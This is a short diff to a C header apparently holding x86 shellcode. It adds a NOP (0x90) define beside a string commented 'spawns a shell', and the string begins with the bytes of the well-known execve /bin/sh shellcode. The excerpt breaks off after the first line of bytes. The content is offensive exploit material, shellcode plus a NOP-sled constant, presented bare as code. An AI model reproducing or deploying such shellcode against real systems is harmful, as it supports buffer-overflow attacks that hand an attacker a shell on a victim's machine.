@@ -1,6 +1,8 @@
 #ifndef shellcode_header
 #define shellcode_header
 
+#define NOP 0x90;
+
 // x86 shellcode - spawns a shell
 char *shellcode =
     "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
